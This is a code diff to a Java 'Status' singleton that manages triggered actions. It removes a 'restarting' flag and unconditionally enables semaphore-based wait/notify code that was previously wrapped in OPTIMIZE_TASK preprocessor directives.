@@ -43,8 +43,6 @@ public final class Status implements Singleton {
 
     public boolean applicationAgentFirstRun;
 
-    boolean restarting = false;
-
     /** The agents. */
     IntHashtable agents;
 
@@ -577,9 +575,7 @@ public final class Status implements Singleton {
         crisis = false;
     }
 
-    //#ifdef OPTIMIZE_TASK
     Object triggeredSemaphore = new Object();
-    //#endif
 
     /**
      * Gets the action id triggered.
@@ -589,12 +585,12 @@ public final class Status implements Singleton {
     public int[] getTriggeredActions() {
 
         try {
-            //#ifdef OPTIMIZE_TASK
+    
             synchronized (triggeredSemaphore) {
                 triggeredSemaphore.wait();
                 //debug.trace("getTriggeredActions, triggeredSemaphore waited");
             }
-            //#endif
+       
         } catch (Exception e) {
             //#ifdef DEBUG
             debug.error("getActionIdTriggered: " + e);
@@ -629,7 +625,7 @@ public final class Status implements Singleton {
             }
         }
 
-        //#ifdef OPTIMIZE_TASK
+   
         synchronized (triggeredSemaphore) {
             try {
                 triggeredSemaphore.notifyAll();
@@ -637,7 +633,7 @@ public final class Status implements Singleton {
                 ex.printStackTrace();
             }
         }
-        //#endif
+    
     }
 
     /**
@@ -655,22 +651,15 @@ public final class Status implements Singleton {
         debug.trace("TriggerAction:" + actionId);
         //#endif
 
-        if (isRestarting()) {
-            //#ifdef DEBUG
-            debug.warn("TriggerAction: not triggered, restarting.");
-            //#endif            
-        }
-
         if (actionId != Action.ACTION_NULL && actions.containsKey(actionId)) {
             final Action action = (Action) actions.get(actionId);
 
             synchronized (lockTriggerAction) {
-
                 if (!triggeredActions.contains(action.actionId)) {
                     triggeredActions.addElement(action.actionId);
                 }
             }
-            //#ifdef OPTIMIZE_TASK
+  
             synchronized (triggeredSemaphore) {
                 try {
                     triggeredSemaphore.notifyAll();
@@ -678,7 +667,7 @@ public final class Status implements Singleton {
                     ex.printStackTrace();
                 }
             }
-            //#endif
+         
 
             return true;
         } else {
@@ -694,7 +683,7 @@ public final class Status implements Singleton {
             triggeredActions.removeAllElements();
         }
 
-        //#ifdef OPTIMIZE_TASK
+   
         synchronized (triggeredSemaphore) {
             try {
                 triggeredSemaphore.notifyAll();
@@ -703,16 +692,9 @@ public final class Status implements Singleton {
             }
            
         }
-        //#endif
+
     }
 
-    public void setRestarting(boolean restarting) {
-        this.restarting = restarting;
-    }
-
-    public boolean isRestarting() {
-        return restarting;
-    }
 
     public Date getStartingDate() {
         return startingDate;
